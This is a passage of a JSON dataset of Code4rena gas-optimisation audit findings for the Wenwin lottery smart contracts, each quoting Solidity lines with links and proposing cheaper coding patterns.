      "title": "[G-16] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "\nWhen using elements that are smaller than 32 bytes, your contract's gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\n\nEach operation involving a `uint8` costs an extra 22-28 gas (depending on whether the other operand is also a variable of type `uint8`) as compared to ones involving `uint256`, due to the compiler having to clear the higher bits of the memory word before operating on the `uint8`, as well as the associated stack operations of doing so. Use a larger size then downcast where needed\n\n### Proof Of Concept\n\n\n```solidity\n34: uint128 public override currentDraw;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L34\n\n```solidity\n162: uint120 _winningTicket = winningTicket[ticketInfo.drawId];\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L162\n\n```solidity\n204: uint120 _winningTicket = TicketUtils.reconstructTicket(randomNumber, selectionSize, selectionMax);\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L204\n\n```solidity\n205: uint128 drawFinalized = currentDraw++;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L205\n\n```solidity\n273: uint128 drawId = currentDraw - LotteryMath.DRAWS_PER_YEAR;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L273\n\n```solidity\n24: uint128 public constant DRAWS_PER_YEAR = 52;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotteryMath.sol#L24\n\n```solidity\n30: uint8 public immutable override selectionSize;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L30\n\n```solidity\n31: uint8 public immutable override selectionMax;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L31\n\n```solidity\n170: uint16 reward = uint16(rewards[winTier] / divisor);\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L170\n\n```solidity\n54: uint8[] memory numbers = new uint8[](selectionSize);\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/TicketUtils.sol#L54\n\n```solidity\n66: uint8 currentNumber = numbers[i];\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/TicketUtils.sol#L66\n\n```solidity\n94: uint120 intersection = ticket & winningTicket;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/TicketUtils.sol#L94\n\n```solidity\n97: intersection >>= 1;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/TicketUtils.sol#L97\n\n```solidity\n10: uint16 public immutable override requestConfirmations;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/VRFv2RNSource.sol#L10\n\n```solidity\n11: uint32 public immutable override callbackGasLimit;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/VRFv2RNSource.sol#L11\n\n```solidity\n71: uint8 selectionSize;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/interfaces/ILotterySetup.sol#L71\n\n```solidity\n73: uint8 selectionMax;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/interfaces/ILotterySetup.sol#L73\n\n```solidity\n14: uint128 referrerTicketCount;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/interfaces/IReferralSystem.sol#L14\n\n```solidity\n16: uint128 playerTicketCount;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/interfaces/IReferralSystem.sol#L16\n\n```solidity\n13: uint128 drawId;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/interfaces/ITicket.sol#L13\n\n```solidity\n15: uint120 combination;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/interfaces/ITicket.sol#L15\n\n\n\n\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-16-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "8928",
      "title": "[G-15] Structs can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "\nEach slot saved can avoid an extra Gsset (20000 gas) for the first setting of the struct. Subsequent reads as well as writes have smaller gas savings.\n\n### Proof Of Concept\n\n```solidity\n63: struct LotterySetupParams {\n    /// @dev Token to be used as reward token for the lottery\n    IERC20 token;\n    /// @dev Parameters of the draw schedule for the lottery\n    LotteryDrawSchedule drawSchedule;\n    /// @dev Price to pay for playing single game (including fee)\n    uint256 ticketPrice;\n    /// @dev Count of numbers user picks for the ticket\n    uint8 selectionSize;\n    /// @dev Max number user can pick\n    uint8 selectionMax;\n    /// @dev Expected payout for one ticket, expressed in `rewardToken`\n    uint256 expectedPayout;\n    /// @dev Array of fixed rewards per each non jackpot win\n    uint256[] fixedRewards;\n}\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/interfaces/ILotterySetup.sol#L63-L78\n\nCan save 1 storage slot by changing to:\n\n```solidity\n63: struct LotterySetupParams {\n    IERC20 token;\n    uint8 selectionSize;\n    uint8 selectionMax;\n    LotteryDrawSchedule drawSchedule;\n    uint256 ticketPrice;\n    uint256 expectedPayout;\n    uint256[] fixedRewards;\n}\n\n```\n\nCan save an additional storage slot if `ticketPrice` and `expectedPayout` can be of size `uint128` if it is unlikely to ever reach `uint128.max` then we can save a total of 2 storage slots by changing to:\n\n```solidity\n63: struct LotterySetupParams {\n    IERC20 token;\n    uint8 selectionSize;\n    uint8 selectionMax;\n    LotteryDrawSchedule drawSchedule;\n    uint128 ticketPrice;\n    uint128 expectedPayout;\n    uint256[] fixedRewards;\n}\n\n```\n\n\nIn addition for the following structs, these can be changed from `uint256` to `uint64` as it is unlikely for it to reach timestamp the max value of `uint256`\n```solidity\nstruct LotteryDrawSchedule {\n    /// @dev First draw is scheduled to take place at this timestamp\n    uint256 firstDrawScheduledAt;\n    /// @dev Period for running lottery\n    uint256 drawPeriod;\n    /// @dev Cooldown period when users cannot register tickets for draw anymore\n    uint256 drawCoolDownPeriod;\n}\n```\n\nCan save 2 storage slots by changing to:\n```solidity\nstruct LotteryDrawSchedule {\n    /// @dev First draw is scheduled to take place at this timestamp\n    uint64 firstDrawScheduledAt;\n    /// @dev Period for running lottery\n    uint64 drawPeriod;\n    /// @dev Cooldown period when users cannot register tickets for draw anymore\n    uint64 drawCoolDownPeriod;\n}\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/interfaces/ILotterySetup.sol#L53-L60\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-15-structs-can-be-packed-into-fewer-storage-slots",
      "tags": [],
      "finders": []
    },
    {
      "id": "8927",
      "title": "[G-14] Help The Optimizer By Saving A Storage Variable's Reference Instead Of Repeatedly Fetching It",
      "impact": "GAS",
      "content": "\nTo help the optimizer, declare a storage type variable and use it instead of repeatedly fetching the reference in a map or an array.\n\nThe effect can be quite significant.\n\nAs an example, instead of repeatedly calling someMap[someIndex], save its reference like this: SomeStruct storage someStruct = someMap[someIndex] and use it.\n\n### Proof Of Concept\n\n```solidity\n170: uint16 reward = uint16(rewards[winTier] / divisor);\n171: if ((rewards[winTier] % divisor) != 0) {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L170-L171\n\n```solidity\n78: claimedReward += claimPerDraw(drawIds[counter]);\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/ReferralSystem.sol#L78\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-14-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it",
      "tags": [],
      "finders": []
    },
    {
      "id": "8926",
      "title": "[G-13] Shorten the array rather than copying to a new one",
      "impact": "GAS",
      "content": "\nInline-assembly can be used to shorten the array by changing the length slot, so that the entries don't have to be copied to a new, shorter array.\n\n### Proof Of Concept\n\n\n```solidity\n54: uint8[] memory numbers = new uint8[](selectionSize);\n63: bool[] memory selected = new bool[](selectionMax);\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/TicketUtils.sol#L54\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/TicketUtils.sol#L63\n\n\n\n\n\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-13-shorten-the-array-rather-than-copying-to-a-new-one",
      "tags": [],
      "finders": []
    },
    {
      "id": "8925",
      "title": "[G-12] `require()` Should Be Used Instead Of `assert()`",
      "impact": "GAS",
      "content": "\n```solidity\n147: assert(initialPot > 0);\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L147\n\n```solidity\n99: assert((winTier <= selectionSize) && (intersection == uint256(0)));\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/TicketUtils.sol#L99\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-12-require-should-be-used-instead-of-assert",
      "tags": [],
      "finders": []
    },
    {
      "id": "8924",
      "title": "[G-11] Public Functions To External",
      "impact": "GAS",
      "content": "\nThe following functions could be set external to save gas and improve code quality.\nExternal call cost is less expensive than of public functions.\n\n### Proof Of Concept\n\n\n```solidity\nfunction currentRewardSize(uint8 winTier) public view override returns (uint256 rewardSize) {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L234\n\n```solidity\nfunction fixedReward(uint8 winTier) public view override returns (uint256 amount) {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L120\n\n```solidity\nfunction drawScheduledAt(uint128 drawId) public view override returns (uint256 time) {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L152\n\n```solidity\nfunction ticketRegistrationDeadline(uint128 drawId) public view override returns (uint256 time) {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L156\n\n```solidity\nfunction rewardPerToken() public view override returns (uint256 _rewardPerToken) {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/Staking.sol#L48\n\n```solidity\nfunction earned(address account) public view override returns (uint256 _earned) {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/Staking.sol#L61\n\n```solidity\nfunction withdraw(uint256 amount) public override {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/Staking.sol#L79\n\n```solidity\nfunction getReward() public override {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/Staking.sol#L91\n\n\n\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-11-public-functions-to-external",
      "tags": [],
      "finders": []
    },
    {
      "id": "8923",
      "title": "[G-10] `<x> += <y>` Costs More Gas Than `<x> = <x> + <y>` For State Variables",
      "impact": "GAS",
      "content": "\n```solidity\n129: frontendDueTicketSales[frontend] += tickets.length;\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L129\n\n```solidity\n173: claimedAmount += claimWinningTicket(ticketIds[i]);\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L173\n\n```solidity\n275: currentNetProfit += int256(unclaimedJackpotTickets * winAmount[drawId][selectionSize]);\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L275\n\n```solidity\n55: newProfit -= int256(expectedRewardsOut);\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotteryMath.sol#L55\n\n```solidity\n64: excessPotInt -= int256(fixedJackpotSize);\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotteryMath.sol#L64\n\n```solidity\n84: bonusMulti += (excessPot * EXCESS_BONUS_ALLOCATION) / (ticketsSold * expectedPayout);\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotteryMath.sol#L84\n\n```solidity\n64: totalTicketsForReferrersPerDraw[currentDraw] +=\n67: totalTicketsForReferrersPerDraw[currentDraw] += numberOfTickets;\n69: unclaimedTickets[currentDraw][referrer].referrerTicketCount += uint128(numberOfTickets);\n71: unclaimedTickets[currentDraw][player].playerTicketCount += uint128(numberOfTickets);\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/ReferralSystem.sol#L64\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/ReferralSystem.sol#L67\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/ReferralSystem.sol#L69\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/ReferralSystem.sol#L71\n\n\n\n```solidity\n78: claimedReward += claimPerDraw(drawIds[counter]);\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/ReferralSystem.sol#L78\n\n```solidity\n147: claimedReward += playerRewardsPerDrawForOneTicket[drawId] * _unclaimedTickets.playerTicketCount;\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/ReferralSystem.sol#L147\n\n```solidity\n29: ticketSize += (ticket & uint256(1));\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/TicketUtils.sol#L29\n\n```solidity\n96: winTier += uint8(intersection & uint120(1));\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/TicketUtils.sol#L96\n\n```solidity\n30: depositedBalance += amount;\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/StakedTokenLock.sol#L30\n\n```solidity\n43: depositedBalance -= amount;\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/StakedTokenLock.sol#L43\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-10-x--y-costs-more-gas-than-x--x--y-for-state-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "8922",
      "title": "[G-09] Optimize names to save gas",
      "impact": "GAS",
      "content": "\nContracts most called functions could simply save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. \n\nSee more <a href=\"https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92\">here</a>.\n\n### Proof Of Concept\n\nAll in-scope contracts.\n\n### Recommended Mitigation Steps\n\nFind a lower method ID name for the most called functions for example `Call()` vs. `Call1()` is cheaper by 22 gas.\n\nFor example, the function IDs in the Gauge.sol contract will be the most used; A lower method ID may be given.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-09-optimize-names-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "8921",
      "title": "[G-08] Multiple Address Mappings Can Be Combined Into A Single Mapping Of An Address To A Struct, Where Appropriate",
      "impact": "GAS",
      "content": "\nSaves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot.\n\n### Proof Of Concept\n\n\n```solidity\n19: mapping(address => uint256) public override userRewardPerTokenPaid;\n20: mapping(address => uint256) public override rewards;\n\n//@audit Can be edited to the following struct:\nstruct addressRewardsStruct {\n    uint256 userRewardPerTokenPaid;\n    uint256 rewards;\n}\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/Staking.sol#L20\n\n\n\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-08-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate",
      "tags": [],
      "finders": []
    },
    {
      "id": "8920",
      "title": "[G-07] `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\n### Proof Of Concept\n\n```solidity\n203: function receiveRandomNumber\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L203\n\n```solidity\n279: function requireFinishedDraw\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L279\n\n```solidity\n285: function mintNativeTokens\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L285\n\n```solidity\n160: function _baseJackpot\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L160\n\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-07-internal-functions-only-called-once-can-be-inlined-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "8919",
      "title": "[G-06] Use hardcode address instead `address(this)`",
      "impact": "GAS",
      "content": "\nInstead of using `address(this)`, it is more gas-efficient to pre-calculate and use the hardcoded `address`. Foundry's script.sol and solmate's `LibRlp.sol` contracts can help achieve this.\n\nReferences: \nhttps://book.getfoundry.sh/reference/forge-std/compute-create-address \n\nhttps://twitter.com/transmissions11/status/1518507047943245824\n\n### Proof Of Concept\n\n```solidity\n130: rewardToken.safeTransferFrom(msg.sender, address(this), ticketPrice * tickets.length);\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L130\n\n```solidity\n140: uint256 raised = rewardToken.balanceOf(address(this));\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L140\n\n```solidity\n34: stakedToken.transferFrom(msg.sender, address(this), amount);\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/StakedTokenLock.sol#L34\n\n```solidity\n55: rewardsToken.transfer(owner(), rewardsToken.balanceOf(address(this)));\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/StakedTokenLock.sol#L55\n\n```solidity\n73: stakingToken.safeTransferFrom(msg.sender, address(this), amount);\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/Staking.sol#L73\n\n\n\n### Recommended Mitigation Steps\n\nUse hardcoded `address`.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-06-use-hardcode-address-instead-addressthis",
      "tags": [],
      "finders": []
    },
    {
      "id": "8918",
      "title": "[G-05] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier or require such as onlyOwner/onlyX is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2), DUP1(3), ISZERO(3), PUSH2(3), JUMPI(10), PUSH1(3), DUP1(3), REVERT(0), JUMPDEST(1), POP(2) which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.\n\n### Proof Of Concept\n\n```solidity\n77: function initSource(IRNSource rnSource) external override onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/RNSourceController.sol#L77\n\n```solidity\n89: function swapSource(IRNSource newSource) external override onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/RNSourceController.sol#L89\n\n```solidity\n24: function deposit(uint256 amount) external override onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/StakedTokenLock.sol#L24\n\n```solidity\n37: function withdraw(uint256 amount) external override onlyOwner {\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/StakedTokenLock.sol#L37\n\n\n\n### Recommended Mitigation Steps\nFunctions guaranteed to revert when called by normal users can be marked payable.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-05-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "8917",
      "title": "[G-04] Using `delete` statement can save gas",
      "impact": "GAS",
      "content": "\n### Proof Of Concept\n\n```solidity\n255: frontendDueTicketSales[beneficiary] = 0;\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L255\n\n```solidity\n142: unclaimedTickets[drawId][msg.sender].referrerTicketCount = 0;\n148: unclaimedTickets[drawId][msg.sender].playerTicketCount = 0;\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/ReferralSystem.sol#L142\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/ReferralSystem.sol#L148\n\n\n\n```solidity\n52: failedSequentialAttempts = 0;\n53: maxFailedAttemptsReachedAt = 0;\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/RNSourceController.sol#L52-L53\n\n```solidity\n99: failedSequentialAttempts = 0;\n100: maxFailedAttemptsReachedAt = 0;\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/RNSourceController.sol#L99-L100\n\n```solidity\n95: rewards[msg.sender] = 0;\n\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/Staking.sol#L95\n\n\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-04-using-delete-statement-can-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "8916",
      "title": "[G-03] Do not calculate constants",
      "impact": "GAS",
      "content": "\nDue to how constant variables are implemented (replacements at compile-time), an expression assigned to a constant variable is recomputed each time that the variable is used, which wastes some gas.\n\n### Proof Of Concept\n\n```solidity\n14: uint256 public constant STAKING_REWARD = 20 * PercentageMath.ONE_PERCENT;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotteryMath.sol#L14\n\n```solidity\n16: uint256 public constant FRONTEND_REWARD = 10 * PercentageMath.ONE_PERCENT;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotteryMath.sol#L16\n\n```solidity\n18: uint256 public constant TICKET_PRICE_TO_POT = PercentageMath.PERCENTAGE_BASE - STAKING_REWARD - FRONTEND_REWARD;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotteryMath.sol#L18\n\n```solidity\n20: uint256 public constant SAFETY_MARGIN = 67 * PercentageMath.ONE_PERCENT;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotteryMath.sol#L20\n\n```solidity\n22: uint256 public constant EXCESS_BONUS_ALLOCATION = 50 * PercentageMath.ONE_PERCENT;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotteryMath.sol#L22\n\n```solidity\n36: uint256 private constant BASE_JACKPOT_PERCENTAGE = 30_030; // 30.03%\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L36\n\n\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-03-do-not-calculate-constants",
      "tags": [],
      "finders": []
    },
    {
      "id": "8915",
      "title": "[G-02] Setting the `constructor` to `payable`",
      "impact": "GAS",
      "content": "\nSaves ~13 gas per instance\n\n### Proof Of Concept\n\n```solidity\n84: constructor(\n        LotterySetupParams memory lotterySetupParams,\n        uint256 playerRewardFirstDraw,\n        uint256 playerRewardDecreasePerDraw,\n        uint256[] memory rewardsToReferrersPerDraw,\n        uint256 maxRNFailedAttempts,\n        uint256 maxRNRequestDelay\n    )\n        Ticket()\n        LotterySetup(lotterySetupParams)\n        ReferralSystem(playerRewardFirstDraw, playerRewardDecreasePerDraw, rewardsToReferrersPerDraw)\n        RNSourceController(maxRNFailedAttempts, maxRNRequestDelay)\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Lottery.sol#L84\n\n```solidity\n41: constructor(LotterySetupParams memory lotterySetupParams)\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L41\n\n```solidity\n17: constructor() ERC20(\"Wenwin Lottery\", \"LOT\")\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotteryToken.sol#L17\n\n```solidity\n27: constructor(\n        uint256 _playerRewardFirstDraw,\n        uint256 _playerRewardDecreasePerDraw,\n        uint256[] memory _rewardsToReferrersPerDraw\n    )\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/ReferralSystem.sol#L27\n\n```solidity\n11: constructor(address _authorizedConsumer)\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/RNSourceBase.sol#L11\n\n```solidity\n26: constructor(uint256 _maxFailedAttempts, uint256 _maxRequestDelay)\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/RNSourceController.sol#L26\n\n```solidity\n17: constructor() ERC721(\"Wenwin Lottery Ticket\", \"WLT\")\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/Ticket.sol#L17\n\n```solidity\n13: constructor(\n        address _authorizedConsumer,\n        address _linkAddress,\n        address _wrapperAddress,\n        uint16 _requestConfirmations,\n        uint32 _callbackGasLimit\n    )\n        RNSourceBase(_authorizedConsumer)\n        VRFV2WrapperConsumerBase(_linkAddress, _wrapperAddress)\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/VRFv2RNSource.sol#L13\n\n```solidity\n16: constructor(address _stakedToken, uint256 _depositDeadline, uint256 _lockDuration)\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/StakedTokenLock.sol#L16\n\n```solidity\n22: constructor(\n        ILottery _lottery,\n        IERC20 _rewardsToken,\n        IERC20 _stakingToken,\n        string memory name,\n        string memory symbol\n    )\n        ERC20(name, symbol)\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/Staking.sol#L22\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-02-setting-the-constructor-to-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "8914",
      "title": "[G-01] Use calldata instead of memory for function parameters",
      "impact": "GAS",
      "content": "\nIn some cases, having function arguments in calldata instead of memory is more optimal.\n\nConsider the following generic example:\n```\ncontract C {\n    function add(uint[] memory arr) external returns (uint sum) {\n        uint length = arr.length;\n        for (uint i = 0; i < arr.length; i++) {\n            sum += arr[i];\n        }\n    }\n}\n```\nIn the above example, the dynamic array arr has the storage location memory. When the function gets called externally, the array values are kept in calldata and copied to memory during ABI decoding (using the opcode calldataload and mstore). And during the for loop, arr[i] accesses the value in memory using a mload. However, for the above example this is inefficient. Consider the following snippet instead:\n```\ncontract C {\n    function add(uint[] calldata arr) external returns (uint sum) {\n        uint length = arr.length;\n        for (uint i = 0; i < arr.length; i++) {\n            sum += arr[i];\n        }\n    }\n}\n```\nIn the above snippet, instead of going via memory, the value is directly read from calldata using calldataload. That is, there are no\nintermediate memory operations that carries this value.\n\nGas savings: In the former example, the ABI decoding begins with\ncopying value from calldata to memory in a for loop. Each iteration\nwould cost at least 60 gas. In the latter example, this can be\ncompletely avoided. This will also reduce the number of instructions and\ntherefore reduces the deploy time cost of the contract.\n\nIn short, use calldata instead of memory if the function argument\nis only read.\n\nNote that in older Solidity versions, changing some function arguments\nfrom memory to calldata may cause \"unimplemented feature error\".\nThis can be avoided by using a newer (0.8.*) 